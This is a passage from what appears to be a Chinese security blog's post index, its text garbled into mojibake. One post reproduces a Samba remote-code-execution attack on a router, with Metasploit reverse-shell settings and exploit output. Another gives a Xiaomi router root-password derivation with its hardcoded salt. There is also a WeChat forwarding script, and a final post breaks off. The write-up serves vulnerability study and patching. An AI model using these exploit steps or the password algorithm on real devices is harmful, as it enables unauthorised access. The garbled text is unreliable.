è·Ÿè¿›åˆ°smb_probe_module() å†è·Ÿè¿›åˆ°do_smb_load_module()ï¼Œå‘ç°è°ƒç”¨çš„è¿‡ç¨‹å°±åœ¨å…¶ä¸­,è°ƒç”¨äº†ä¼ è¿›æ¥çš„moudule_nameå¯¹åº”çš„init_samba_moduleå‡½æ•° æˆ‘ä»¬å¯ä»¥é€šè¿‡smbæœåŠ¡ä¸Šä¼ ä¸€ä¸ªæ¶æ„çš„soæ–‡ä»¶ï¼Œéšåé€šè¿‡ä¸Šè¿°è¿‡ç¨‹è¿›è¡Œè°ƒç”¨ï¼Œæ‰§è¡Œä»»æ„ä»£ç ã€‚ æ¼æ´å¤ç°æŸè·¯ç”±å™¨æ»¡è¶³æ¡ä»¶123456netstat -apnttcp 0 0 192.168.31.1:445 0.0.0.0:* LISTEN 0 572 1917/smbdnmap 192.168.31.1139/tcp open netbios-ssn445/tcp open microsoft-ds ç«¯å£å·²å¼€å¯12345678910111213141516171819202122232425262728293031323334353637383940414243444546vim /etc/samba/smb.conf deadtime = 30 domain master = yes encrypt passwords = true enable core files = no guest account = nobody guest ok = yes invalid users = local master = yes load printers = no map to guest = Bad User min receivefile size = 16384 null passwords = yes obey pam restrictions = yes passdb backend = smbpasswd preferred master = yes printable = no smb encrypt = disabled smb passwd file = /etc/samba/smbpasswd socket options = SO_SNDBUFFORCE=1048576 SO_RCVBUFFORCE=1048576 smb2 max trans = 1048576 smb2 max write = 1048576 smb2 max read = 1048576 write cache size = 262144 syslog = 2 syslog only = yes use sendfile = yes writeable = yes log level = 1 unicode = True max log size = 500 log file = /tmp/log/samba.log server role = STANDALONE[homes] comment = Home Directories browsable = no read only = no create mode = 0750[data] ***SMB_SHARE_NAME*** path = /tmp ***SMB_FOLDER*** read only = no ***å…·å¤‡å¯å†™æƒé™*** guest ok = yes ***å…è®¸åŒ¿å*** create mask = 0777 directory mask = 0777 å…·æœ‰å¯å†™æƒé™ã€ç›®å½•ä¸º/tmp æ”»å‡»ï¼šä½¿ç”¨metasploitè®¾ç½®æ”»å‡»å‚æ•°é¶æœºæ˜¯æŸå‚å•†è·¯ç”±å™¨ï¼Œå®ƒçš„ç³»ç»Ÿä¸ºmipsæ¶æ„ï¼Œä½†æ˜¯è¿™ä¸ªåº“å¥½åƒå¯¹å®ƒçš„æ”¯æŒä¸æ˜¯å¾ˆå¥½12345678910111213141516171819202122232425show optionsModule options (exploit/linux/samba/is_known_pipename): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS 192.168.31.1 yes The target address range or CIDR identifier RPORT 445 yes The SMB service port (TCP) SMB_FOLDER no The directory to use within the writeable SMB share SMB_SHARE_NAME no The name of the SMB share containing a writeable directoryPayload options (generic/shell_reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 192.168.216.129 yes The listen address (an interface may be specified) LPORT 4444 yes The listen portExploit target: Id Name -- ---- 7 Linux MIPSLE æ‰§è¡Œæ”»å‡»123456789101112exploit[*] Started reverse TCP handler on 192.168.216.129:4444[*] 192.168.31.1:445 - Using location \\\\192.168.31.1\\data\\ for the path[*] 192.168.31.1:445 - Retrieving the remote path of the share &apos;data&apos;[*] 192.168.31.1:445 - Share &apos;data&apos; has server-side path &apos;/tmp[*] 192.168.31.1:445 - Uploaded payload to \\\\192.168.31.1\\data\\KcQiOcbk.so[*] 192.168.31.1:445 - Loading the payload from server-side path /tmp/KcQiOcbk.so using \\\\PIPE\\/tmp/KcQiOcbk.so...[-] 192.168.31.1:445 - &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND[*] 192.168.31.1:445 - Loading the payload from server-side path /tmp/KcQiOcbk.so using /tmp/KcQiOcbk.so...[-] 192.168.31.1:445 - &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND[*] Exploit completed, but no session was created. è™½ç„¶æŠ¥é”™ï¼Œä½†æ˜¯æŸ¥çœ‹å…±äº«æ–‡ä»¶å¤¹/tmpå´å‘ç°äº†ç”Ÿæˆäº†.soæ–‡ä»¶çŸ¥ä¹è¿™ç¯‡ä¸“æ ä¹Ÿæœ‰ç›¸åŒé—®é¢˜ ä¿®è¡¥æ–¹æ¡ˆæœ€å®‰å…¨çš„æ–¹æ³•è¿˜æ˜¯æ‰“è¡¥ä¸æˆ–è€…å‡çº§åˆ°Samba 4.6.4/4.5.10/4.4.14ä»»æ„ç‰ˆæœ¬ï¼Œå¯ä»¥å‚è€ƒ https://www.samba.org/samba/history/security.html å¦‚æœæš‚æ—¶ä¸èƒ½å‡çº§ç‰ˆæœ¬æˆ–å®‰è£…è¡¥ä¸ï¼Œå¯ä»¥ä½¿ç”¨ä¸´æ—¶è§£å†³æ–¹æ¡ˆï¼šåœ¨smb.confçš„[global]æ¿å—ä¸­æ·»åŠ å‚æ•°ï¼šnt pipe support = noç„¶åé‡å¯smbdæœåŠ¡ã€‚ åˆ†æPOCï¼ŒæŸ¥æ‰¾åŸå› (æ¥è‡ªWzâ€™blog) å»ºç«‹SMBè¿æ¥ã€‚è‹¥éœ€è¦è´¦å·å¯†ç ç™»å½•ï¼Œåˆ™å¿…é¡»ç™»å½•åæ‰èƒ½ç»§ç»­ä»å¾®è½¯ä¸Šæ‰’çš„SMBåè®®å»ºç«‹æ—¶åºå›¾ï¼š å¯¹åº”POC: åˆ©ç”¨NetShareEnumAlléå†ç›®æ ‡æœåŠ¡å™¨çš„å…±äº«å(ShareName)ä»¥åŠè·å–å¯¹åº”çš„å…±äº«æ–‡ä»¶å¤¹ä¸‹çš„å¯å†™è·¯å¾„(Path) å…¶ä¸­find_writeable_path()å‡½æ•°éœ€è¦è·Ÿè¿›çœ‹ä¸€ä¸‹ï¼š å†è·Ÿè¿›çœ‹enumerate_directories()ä»¥åŠverify_writeable_directoryå‡½æ•° å¯ä»¥çœ‹åˆ°ä»£ç é€»è¾‘å¾ˆæ¸…æ¥šï¼Œé¦–å…ˆéå†å‡ºå½“å‰è·¯å¾„æ‰€æœ‰çš„æ–‡ä»¶å¤¹ï¼Œç„¶åå°è¯•å¾€é‡Œé¢å†™ä¸€ä¸ªéšæœºçš„txtæ–‡ä»¶ç”¨ä½œå¯å†™æµ‹è¯•ï¼Œéšååˆ é™¤æ‰txtæ–‡ä»¶ï¼Œè®°å½•ä¸‹å¯å†™çš„æ–‡ä»¶è·¯å¾„ã€‚è‡³æ­¤ï¼Œæˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ªå…±äº«å(å³æœ¬ä¾‹ä¸­çš„data)ä»¥åŠå…¶å½“å‰è·¯å¾„ä¸‹çš„å¯å†™ç›®å½•(/tmp) åˆ©ç”¨NetShareGetInfoè·å–å…±äº«æ–‡ä»¶å¤¹çš„ç»å¯¹è·¯å¾„(SharePath)è‡³æ­¤è·å–åˆ°äº†å…±äº«ådataçš„ç»å¯¹è·¯å¾„ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œè·Ÿæ—©æœŸçš„Payloadä¸ä¸€æ ·ï¼Œæ—©æœŸçš„payloadæ˜¯é æš´åŠ›çŒœè§£ç›®å½•ï¼Œæ‰€ä»¥è·Ÿä¸€äº›åˆ†ææ–‡ç« æœ‰äº›å‡ºå…¥ã€‚ç°åœ¨çš„Payloadæ˜¯æ ¹æ®NetShareGetInfoç›´æ¥è·å–åˆ°å‡†ç¡®çš„è·¯å¾„ï¼Œæå¤§åœ°æé«˜äº†æ”»å‡»çš„æˆåŠŸç‡ã€‚ ä¸Šä¼ æ¶æ„soæ–‡ä»¶å…¶ä¸­å†™å…¥çš„soæ–‡ä»¶æ˜¯Metasploitç”Ÿæˆçš„åå¼¹shellï¼Œå¾ˆç®€å•çš„æ‰§è¡Œä¸€å¥å‘½ä»¤ã€‚æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„çš„æ˜¯é‡Œé¢çš„å‡½æ•°åå¿…é¡»æ˜¯samba_init_moduleå¹¶ä¸”æ˜¯ä¸€ä¸ªå¯¼å‡ºå‡½æ•°ï¼Œè¿™ä¸ªåŸå› ä¸Šè¿°çš„æ¼æ´åˆ†æä¹Ÿæœ‰æåŠã€‚ è°ƒç”¨æ¶æ„æ–‡ä»¶ï¼Œå¹¶æ‰§è¡Œechoå‘½ä»¤æ‰“å°éšæœºå­—ç¬¦ä¸²æ£€éªŒæ˜¯å¦è°ƒç”¨æˆåŠŸåˆ©ç”¨ä»ç¬¬2æ­¥è·å–åˆ°çš„å¯å†™æ–‡ä»¶ç›®å½•(Path)ä»¥åŠä»ç¬¬3æ­¥å¾—åˆ°çš„å…±äº«æ–‡ä»¶ç»å¯¹è·¯å¾„(SharePath)æ„é€ æ¶æ„ç®¡é“å\\PIPE\\/SharePath/Path/Evil.soï¼Œç„¶åé€šè¿‡SMB_COM_NT_CREATE_ANDXè¿›è¡Œè°ƒç”¨ã€‚åœ¨å¤ç°æ—¶ï¼Œè°ƒç”¨æ¶æ„soæ–‡ä»¶æ€»ä¼šå¤±è´¥ï¼Œäº§ç”ŸError Codeä¸ºï¼šSTATUS_OBJECT_NAME_NOT_FOUNDçš„é”™è¯¯ã€‚å°šæœªèƒ½æ˜ç™½ä¸ºä»€ä¹ˆä¼šå‡ºç°è¿™ç§é¦–æ¬¡å¤±è´¥çš„æƒ…å†µï¼Œä¹Ÿè®¸è¦è¯¦ç»†çœ‹çœ‹smbåè®®æ‰èƒ½çŸ¥é“äº†ã€‚POCä»£ç å°†STATUS_OBJECT_PATH_INVALIDä½œä¸ºæˆ‘ä»¬payloadè¢«åŠ è½½çš„æ ‡å¿—ï¼Œéšåå°±æ˜¯ç”¨NBSSåè®®è¿›è¡Œäº†ä¸€æ¬¡è¿œç¨‹ä»£ç æ‰§è¡Œçš„æµ‹è¯•ï¼Œæ‰§è¡Œä»£ç ä¸ºechoéšæœºå­—ç¬¦ä¸²ã€‚ åˆ é™¤æ¶æ„soæ–‡ä»¶ï¼Œæ–­å¼€smbè¿æ¥ ç”±msfç»™å‡ºçš„pocè¿‡ç¨‹å¯è§ï¼Œå¯¹è·¯ç”±å™¨çš„æ”»å‡»åœ¨ç¬¬äº”æ­¥å‡ºç°é—®é¢˜ï¼Œå› æ­¤å‡ºç°Failed to load STATUS_OBJECT_NAME_NOT_FOUND","categories":[{"name":"IOT","slug":"IOT","permalink":"https://cool-y.github.io/categories/IOT/"}],"tags":[{"name":"Samba","slug":"Samba","permalink":"https://cool-y.github.io/tags/Samba/"},{"name":"è¿œç¨‹æ‰§è¡Œ","slug":"è¿œç¨‹æ‰§è¡Œ","permalink":"https://cool-y.github.io/tags/è¿œç¨‹æ‰§è¡Œ/"},{"name":"CVE","slug":"CVE","permalink":"https://cool-y.github.io/tags/CVE/"}]},{"title":"åˆ©ç”¨itchatå®šæ—¶è½¬å‘å¾®ä¿¡æ¶ˆæ¯","slug":"auto-send-WX","date":"2019-03-23T11:48:46.000Z","updated":"2021-04-10T13:36:52.758Z","comments":true,"path":"2019/03/23/auto-send-WX/","link":"","permalink":"https://cool-y.github.io/2019/03/23/auto-send-WX/","excerpt":"","text":"æˆ‘ä»¬å®éªŒå®¤æœ‰ä¸ªå…‰è£ä¼ ç»Ÿï¼Œæ¯å¤©æ—©ä¸Šèµ·åºŠå«é†’æˆ‘çš„ä¸æ˜¯é—¹é’Ÿï¼Œè€Œæ˜¯ç¾¤é‡Œé›·æ‰“ä¸åŠ¨çš„å®‰å…¨æ–°é—»ï¼ˆå…¶å®æˆ‘å…æé†’äº†2333ï¼‰è€Œè¿™ä¸ªå‘é€æ–°é—»çš„äººï¼Œä¸€ä»£ä¸€ä»£çš„ä¼ æ‰¿ï¼Œæˆ‘æ²¡æƒ³åˆ°ç«Ÿç„¶æœ‰ä¸€å¤©ä¼šè½åœ¨æˆ‘å¤´ä¸Šï¼Œå“­äº†o(â•¥ï¹â•¥)oä¸ºäº†ä¸æš´éœ²æˆ‘çš„èµ·åºŠæ—¶é—´ï¼ŒåŒæ—¶èƒ½ä¿è´¨ä¿é‡çš„å®Œæˆä»»åŠ¡ï¼Œæˆ‘å†³å®šåšä¸ªæœºå™¨äººå¸®æˆ‘å®Œæˆã€‚è¿™å°±æ˜¯è¿™ç‰‡poæ–‡çš„ç”±æ¥å•¦ï¼ å¤§æ€å™¨itchatintroductionå…ˆæ¥ä¸€æ®µitchatçš„å®˜æ–¹ä»‹ç»å§ itchatæ˜¯ä¸€ä¸ªå¼€æºçš„å¾®ä¿¡ä¸ªäººå·æ¥å£ï¼Œä½¿ç”¨pythonè°ƒç”¨å¾®ä¿¡ä»æœªå¦‚æ­¤ç®€å•ã€‚ä½¿ç”¨ä¸åˆ°ä¸‰åè¡Œçš„ä»£ç ï¼Œä½ å°±å¯ä»¥å®Œæˆä¸€ä¸ªèƒ½å¤Ÿå¤„ç†æ‰€æœ‰ä¿¡æ¯çš„å¾®ä¿¡æœºå™¨äººã€‚å½“ç„¶ï¼Œè¯¥apiçš„ä½¿ç”¨è¿œä¸æ­¢ä¸€ä¸ªæœºå™¨äººï¼Œæ›´å¤šçš„åŠŸèƒ½ç­‰ç€ä½ æ¥å‘ç°ï¼Œæ¯”å¦‚è¿™äº›ã€‚è¯¥æ¥å£ä¸å…¬ä¼—å·æ¥å£itchatmpå…±äº«ç±»ä¼¼çš„æ“ä½œæ–¹å¼ï¼Œå­¦ä¹ ä¸€æ¬¡æŒæ¡ä¸¤ä¸ªå·¥å…·ã€‚å¦‚ä»Šå¾®ä¿¡å·²ç»æˆä¸ºäº†ä¸ªäººç¤¾äº¤çš„å¾ˆå¤§ä¸€éƒ¨åˆ†ï¼Œå¸Œæœ›è¿™ä¸ªé¡¹ç›®èƒ½å¤Ÿå¸®åŠ©ä½ æ‰©å±•ä½ çš„ä¸ªäººçš„å¾®ä¿¡å·ã€æ–¹ä¾¿è‡ªå·±çš„ç”Ÿæ´»ã€‚ å®é™…ä¸Šï¼Œitchatæ˜¯å¯¹å¾®ä¿¡ç½‘é¡µç«¯çš„çˆ¬è™«ï¼Œæ‰€ä»¥ï¼Œç½‘é¡µç«¯å¯ä»¥å®ç°çš„åŠŸèƒ½éƒ½æœ‰ï¼Œé‚£ä¹ˆï¼Œæˆ‘æƒ³è¦çš„å®šæ—¶ç¾¤å‘å¾®ä¿¡æ¶ˆæ¯ï¼Œè‡ªç„¶ä¸åœ¨è¯ä¸‹ï¼ åˆæ­¥å°è¯• å®‰è£… 1pip install itchat ä¸€ä¸ªç®€å•å®ä¾‹ï¼šå®ç°ç»™æ–‡ä»¶ä¼ è¾“åŠ©æ‰‹å‘é€æ¶ˆæ¯ 123import itchatitchat.auto_login()itchat.send(&apos;Hello, filehelper&apos;, toUserName=&apos;filehelper&apos;) å®ç°å®šæ—¶è½¬å‘è¿™ä¸ªçš„å®ç°éœ€è¦æ³¨å†Œmsg_register,é€»è¾‘å¾ˆç®€å•ï¼Œå½“æ”¶åˆ°æŒ‡å®šç¾¤é‡Œçš„æŒ‡å®šæ¶ˆæ¯æ—¶ï¼Œå°†æ¶ˆæ¯è½¬å‘åˆ°å¦ä¸€ä¸ªç¾¤ã€‚12345678910111213141516171819202122232425262728293031323334353637383940import itchatfrom datetime import datetimeimport timeimport reimport threadingfrom itchat.content import TEXTfrom itchat.content import *from apscheduler.schedulers.blocking import BlockingScheduler@itchat.msg_register([TEXT], isFriendChat=True, isGroupChat=True, isMpChat=True)def getContent(msg): global g_msg groups = itchat.get_chatrooms(update = True) for g in groups: #print(g[&apos;NickName&apos;]) if g[&apos;NickName&apos;] == &apos;è¢«è½¬å‘çš„ç¾¤å&apos;: from_group = g[&apos;UserName&apos;] if &apos;æ¯æ—¥å®‰å…¨ç®€è®¯&apos; in msg[&apos;Content&apos;]: print(&quot;get message from &quot; + msg[&apos;FromUserName&apos;]) if msg[&apos;FromUserName&apos;] == from_group: g_msg = msg[&apos;Content&apos;] print(&apos;æˆåŠŸè·å¾—ç¾¤æ¶ˆæ¯ï¼Œç­‰å¾…è½¬å‘&apos;) print(int(time.strftime(&quot;%H%M%S&quot;))) while(1): if int(time.strftime(&quot;%H%M%S&quot;)) &gt; 80000: SendMessage(g_msg,&apos;å‘é€çš„å¯¹è±¡ç¾¤å&apos;) g_msg = &apos;&apos; breakdef SendMessage(context,gname): itchat.get_chatrooms(update = True) users = itchat.search_chatrooms(name=gname) userName = users[0][&apos;UserName&apos;] itchat.send_msg(context,toUserName=userName) print(&quot;\\nå‘é€æ—¶é—´: &quot; + datetime.now().strftime(&quot;%Y-%m-%d %H:%M:%S&quot;) + &quot;\\n&quot; &quot;å‘é€åˆ°ï¼š&quot; + gname + &quot;\\n&quot; + &quot;å‘é€å†…å®¹ï¼š&quot; + context + &quot;\\n&quot;) print(&quot;*********************************************************************************&quot;)if __name__ == &apos;__main__&apos;: itchat.auto_login(hotReload=True,enableCmdQR=2) itchat.run(blockThread=False) æ·»åŠ å‘¨æœŸé˜²æ‰çº¿æ®è¯´æ¯ä¸‰ååˆ†é’Ÿå‘é€ä¸€æ¬¡æ¶ˆæ¯å¯é˜²æ­¢ç½‘é¡µç«¯å¾®ä¿¡æ‰çº¿~~123456789101112def loop_send(): nowTime = datetime.now().strftime(&quot;%Y-%m-%d %H:%M:%S&quot;) context = &apos;ç°åœ¨æ˜¯åŒ—äº¬æ—¶é—´ :\\n&apos;+ nowTime +&apos;\\n\\næˆ‘ä»¬è¿˜æ´»ç€&apos; itchat.get_chatrooms(update = True) users = itchat.search_friends(name=u&apos;chengkun&apos;) userName = users[0][&apos;UserName&apos;] itchat.send_msg(context,toUserName=userName)if __name__ == &apos;__main__&apos;: sched = BlockingScheduler() sched.add_job(loop_send,&apos;interval&apos;,minutes=30) sched.start() æŠŠç¨‹åºæ”¾åœ¨æœåŠ¡å™¨ä¸Šæˆ‘æ˜¯åœ¨è…¾è®¯äº‘æœ‰ä¸ªæœåŠ¡å™¨ï¼Œå› ä¸ºè‡ªå·±çš„ç”µè„‘ä¸å¯èƒ½æ—¶æ—¶åˆ»åˆ»å¼€æœºï¼Œæ‰€ä»¥å°±æ”¾åœ¨æœåŠ¡å™¨ä¸Šï¼Œæ–¹æ³•æ˜¯ï¼š1sudo nohup python -u auto_Send.py &gt;&gt; auto_Send.log 2&gt;&amp;1 &amp; ä½¿ç”¨nohupå¯ä»¥è®©ç¨‹åºåœ¨åå°è¿è¡Œ ç„¶åå°†æ—¥å¿—è¾“å‡ºåˆ°auto_Send.logï¼Œæ–¹ä¾¿æˆ‘ä»¬åæœŸå‡ºbugäº†æ’é”™ -uå¯ä»¥é˜²æ­¢è¾“å‡ºåˆ°pythonç¼“å†²åŒº é‡åˆ°çš„å‘çº¿ç¨‹é˜»å¡é—®é¢˜è¿™é‡Œæœ‰ä¸¤ä¸ªçº¿ç¨‹ï¼Œä¸€ä¸ªæ˜¯å®šæ—¶è½¬å‘ï¼Œä¸€ä¸ªæ˜¯å¾ªç¯å‘é€ï¼Œå› æ­¤è¦è®¾ç½®ä¸ºitchat.run(blockThread=False)ä»¥åŠsched = BlockingScheduler()å¦åˆ™ä¼šå¡åœ¨æŸä¸ªæ–¹æ³•ã€‚ æ‰¾ä¸åˆ°ç¾¤ç»„è¿™æ˜¯å› ä¸ºusers = itchat.search_chatrooms(name=gname)ï¼Œåœ¨æœç´¢çš„æ˜¯ä½ ä¿å­˜åˆ°é€šè®¯å½•çš„ç¾¤ç»„ã€‚ äºŒç»´ç æ˜¾ç¤ºä¸å…¨itchat.auto_login(hotReload=True,enableCmdQR=2)ï¼Œéœ€è¦è®¾ç½®ä¸º2","categories":[{"name":"æ‚ä¸ƒæ‚å…«","slug":"æ‚ä¸ƒæ‚å…«","permalink":"https://cool-y.github.io/categories/æ‚ä¸ƒæ‚å…«/"}],"tags":[{"name":"itchat","slug":"itchat","permalink":"https://cool-y.github.io/tags/itchat/"},{"name":"å¾®ä¿¡","slug":"å¾®ä¿¡","permalink":"https://cool-y.github.io/tags/å¾®ä¿¡/"}]},{"title":"å°ç±³å›ºä»¶å·¥å…·mkxqimage","slug":"å°ç±³å›ºä»¶å·¥å…·mkxqimage","date":"2019-03-16T06:57:56.000Z","updated":"2021-04-10T13:35:03.596Z","comments":true,"path":"2019/03/16/å°ç±³å›ºä»¶å·¥å…·mkxqimage/","link":"","permalink":"https://cool-y.github.io/2019/03/16/å°ç±³å›ºä»¶å·¥å…·mkxqimage/","excerpt":"","text":"å°ç±³å›ºä»¶å·¥å…·mkxqimageå°ç±³è‡ªå·±æ”¹äº†ä¸ªæ‰“åŒ…è§£åŒ…å›ºä»¶çš„å·¥å…·ï¼ŒåŸºäº trx æ”¹çš„ï¼ˆæœ¬è´¨ä¸Šè¿˜æ˜¯ trx æ ¼å¼ï¼‰ï¼ŒåŠ äº† RSA éªŒè¯å’Œè§£åŒ…åŠŸèƒ½ï¼Œè·¯ç”±ç³»ç»Ÿé‡Œè‡ªå¸¦ï¼š1234Usage:mkxqimg [-o outfile] [-p private_key] [-f file] [-f file [-f file [-f file ]]] [-x file] [-I] å›ºä»¶æ‰“åŒ…å°ç±³å®˜æ–¹åœ¨æ‰“åŒ…å›ºä»¶æ—¶ç”¨RSAç§é’¥è®¡ç®—å‡ºå›ºä»¶çš„RSAç­¾åï¼Œå°ç±³è·¯ç”±å™¨ä¸‹è½½å›ºä»¶åç”¨RSAå…¬é’¥æ¥éªŒè¯RSAç­¾åï¼Œæœ‰æ•ˆåœ°é˜²æ­¢å›ºä»¶è¢«ç¯¡æ”¹ã€‚ å›ºä»¶è§£åŒ…å›ºä»¶å·¥å…·mkxqimageå®Œæˆå¯¹å›ºä»¶çš„è§£åŒ…ï¼Œåœ¨è§£åŒ…å‰å…ˆæ£€æŸ¥Checksumæ˜¯å¦æ­£ç¡®ï¼Œç„¶ååˆ©ç”¨RSAå…¬é’¥/usr/share/xiaoqiang/public.pemæ£€æŸ¥RSAç­¾åï¼Œè¿™ä¸¤ä¸ªæ­¥éª¤é€šè¿‡åï¼Œæ ¹æ®[0x0C]çš„å›ºä»¶ç±»å‹ï¼Œä»¥åŠ[0x10]ã€[0x14]ã€[0x18]å’Œ[0x1C]çš„4ä¸ªåç§»é‡æ‹†åˆ†å›ºä»¶ã€‚ å›ºä»¶æ›´æ–°ç­¾åæ ¡éªŒå°ç±³è·¯ç”±å™¨è¿›è¡Œå›ºä»¶æ›´æ–°æ—¶åŒæ ·ä¼šè¿›è¡Œç­¾åæ ¡éªŒï¼Œæ–‡ä»¶/usr/share/xiaoqiang/public.pemæ˜¯å®ƒçš„å…¬é’¥ï¼Œç”¨æ¥æ ¡éªŒç­¾åæ­£ç¡®ä¸å¦ã€‚æ­£å› ä¸ºè¿™æ ·ï¼Œé»‘å®¢å¦‚æœæƒ³åœ¨ä¸æ‹†æœºçš„å‰æä¸‹åˆ·å…¥å·²æ¤å…¥æœ¨é©¬çš„å›ºä»¶ï¼Œåªæœ‰ä¸¤æ¡è·¯å¯èµ°ï¼Œä¸€æ˜¯é€šè¿‡å…¥ä¾µã€ç¤¾å·¥æˆ–ç ´è§£å¾—åˆ°å¯¹åº”çš„ç§é’¥ï¼Œç„¶åå¯¹ä¿®æ”¹åçš„å›ºä»¶è¿›è¡Œç­¾åå†åˆ·å…¥ï¼›äºŒæ˜¯é€šè¿‡æ¼æ´ï¼ŒæŒ–æ˜æ–°çš„æ¼æ´æˆ–è€…åˆ·å…¥æœ‰æ¼æ´çš„æ—§ç‰ˆå›ºä»¶ï¼Œç„¶åå†é€šè¿‡æ¼æ´åˆ©ç”¨å¾—åˆ°root shellè¿›è€Œåˆ·å…¥ä»»æ„å›ºä»¶ã€‚ä¸€èˆ¬æ¥è®²ï¼Œç¬¬ä¸€æ¡è·¯æ˜¯å¾ˆéš¾çš„ï¼Œè€Œä¸ºäº†å µä½ç¬¬äºŒæ¡è·¯ï¼Œå¯ä»¥é€šè¿‡é™åˆ¶é™çº§æ¥å®ç°ã€‚ ç”±æ­¤å¯è§ï¼Œåœ¨é™åˆ¶é™çº§çš„å‰æä¸‹ï¼Œåœ¨å›ºä»¶æ›´æ–°æ—¶è¿›è¡Œç­¾åæ ¡éªŒï¼Œèƒ½æœ‰æ•ˆåœ°é˜²æ­¢è·¯ç”±å™¨è¢«æ¤å…¥æœ¨é©¬ã€‚ å›ºä»¶æ ¼å¼è·¯ç”±å›ºä»¶çš„æ ¼å¼ï¼ŒåŸºæœ¬æ˜¯åŸºäº openwrt çš„ trx è¿™ä¸ªç®€å•çš„äºŒè¿›åˆ¶æ–‡ä»¶æ ¼å¼12348 44 52 30 63 D4 11 03 FE 3D 1A FD 05 00 02 0020 00 00 00 20 00 FE 00 00 00 00 00 00 00 00 00FF 04 00 EA 14 F0 9F E5 14 F0 9F E5 14 F0 9F E5 ç¬¬1ï½4å­—èŠ‚ï¼šASCIIå­—ç¬¦ä¸²â€œHDR0â€ï¼Œä½œä¸ºå›ºä»¶çš„æ ‡è¯†ï¼›ç¬¬5ï½8å­—èŠ‚ï¼š4å­—èŠ‚æ•´å‹æ•°0x0311D464ï¼Œè¡¨ç¤ºå›ºä»¶çš„å¤§å°ï¼š51500132å­—èŠ‚ï¼›ç¬¬9~12å­—èŠ‚ï¼šå›ºä»¶çš„æ£€æŸ¥å’Œï¼›ç¬¬13ï½14å­—èŠ‚ï¼š0x0005ï¼Œè¡¨ç¤ºå›ºä»¶ä¸­åŒ…å«å“ªäº›éƒ¨åˆ†ï¼›ç¬¬15ï½16å­—èŠ‚ï¼š0x0002ï¼Œè¡¨ç¤ºå›ºä»¶æ ¼å¼ç‰ˆæœ¬å·ï¼›ç¬¬17ï½20å­—èŠ‚ï¼š0x00000020ï¼Œè¡¨ç¤ºå›ºä»¶ç¬¬ä¸€éƒ¨åˆ†åœ¨æ•´ä¸ªå›ºä»¶ä¸­çš„åç§»é‡ï¼Œ0.4.85å›ºä»¶çš„ç¬¬ä¸€éƒ¨åˆ†æ˜¯brcm4709_nor.binï¼Œä¹Ÿå°±æ˜¯Flashä¸­é™¤0xfe0000-0xff0000çš„board_dataå¤–çš„å…¨é•œåƒï¼›ç¬¬21ï½24å­—èŠ‚ï¼š0x00FE0020ï¼Œè¡¨ç¤ºå›ºä»¶ç¬¬äºŒéƒ¨åˆ†åœ¨æ•´ä¸ªå›ºä»¶ä¸­çš„åç§»é‡ï¼Œ0.4.85å›ºä»¶çš„ç¬¬äºŒéƒ¨åˆ†æ˜¯root.ext4.lzmaï¼Œä¹Ÿå°±æ˜¯ç¡¬ç›˜ä¸­128Må›ºä»¶çš„å‹ç¼©åŒ…ï¼›ç¬¬33å­—èŠ‚å¼€å§‹æ˜¯å›ºä»¶çš„æ­£å¼å†…å®¹å¼€å§‹ã€‚ å°ç±³å¼€å¯sshå·¥å…·åŒ…ä½¿ç”¨mkxqimageè§£åŒ…ï¼ˆç°åœ¨ä¼šæç¤ºç§˜é’¥ä¸å­˜åœ¨ï¼‰12error fopen public keyImage verify failed, not formal image å¦‚æœèƒ½è§£åŒ…åº”è¯¥å¯ä»¥å¾—åˆ°è„šæœ¬æ–‡ä»¶upsetting.sh 1234#!/bin/shnvram set ssh_en=1nvram set flag_init_root_pwd=1nvram commit æ‰§è¡Œè„šæœ¬æ–‡ä»¶upsetting.shåï¼Œå°†ssh_enè®¾ç½®ä¸º1ï¼ŒåŒæ—¶è®¾ç½®äº†flag_init_root_pwdé¡¹ã€‚å½“æ­£å¼å¯åŠ¨æ—¶ï¼Œ/usr/sbin/boot_checkè„šæœ¬æ£€æµ‹åˆ°flag_init_root_pwd=1æ—¶ï¼Œè‡ªåŠ¨ä¿®æ”¹rootç”¨æˆ·å¯†ç ï¼Œå…·ä½“è„šæœ¬ä¸ºï¼š1234567flg_init_pwd=`nvram get flag_init_root_pwd`if [ &quot;$flg_init_pwd&quot; = &quot;1&quot; ]; then init_pwd=`mkxqimage -I` (echo $init_pwd; sleep 1; echo $init_pwd) | passwd root nvram unset flag_init_root_pwd nvram commitfi åˆå§‹å¯†ç æ˜¯mkxqimage -Içš„ç»“æœï¼Œå®é™…æ˜¯æ ¹æ®è·¯ç”±å™¨çš„åºåˆ—å·è®¡ç®—å¾—åˆ°ã€‚è·¯ç”±å™¨çš„åºåˆ—å·å°åœ¨åº•ç›–ä¸Šï¼Œ12ä½æ•°å­—ï¼Œå¦‚ï¼š561000088888 åˆå§‹å¯†ç è®¡ç®—ç®—æ³•ä¸ºï¼š substr(md5(SN+&quot;A2E371B0-B34B-48A5-8C40-A7133F3B5D88&quot;), 0, 8) A2E371B0-B34B-48A5-8C40-A7133F3B5D88 ä¸ºåˆ†æmkxqimageå¾—åˆ°çš„salt","categories":[{"name":"IOT","slug":"IOT","permalink":"https://cool-y.github.io/categories/IOT/"}],"tags":[{"name":"å°ç±³","slug":"å°ç±³","permalink":"https://cool-y.github.io/tags/å°ç±³/"},{"name":"æ–‡ä»¶æ ¼å¼","slug":"æ–‡ä»¶æ ¼å¼","permalink":"https://cool-y.github.io/tags/æ–‡ä»¶æ ¼å¼/"},{"name":"SSH","slug":"SSH","permalink":"https://cool-y.github.io/tags/SSH/"}]},{"title":"QQæ•°æ®åº“çš„åŠ å¯†ä¸è§£å¯†","slug":"qqæ•°æ®åº“çš„åŠ å¯†è§£å¯†","date":"2019-02-22T10:35:27.000Z","updated":"2021-04-10T13:47:12.326Z","comments":true,"path":"2019/02/22/qqæ•°æ®åº“çš„åŠ å¯†è§£å¯†/","link":"","permalink":"https://cool-y.github.io/2019/02/22/qqæ•°æ®åº“çš„åŠ å¯†è§£å¯†/","excerpt":"","text":"qqæ•°æ®åº“é‡‡ç”¨ç®€å•åŠ å¯†â€”â€”å¼‚æˆ–åŠ 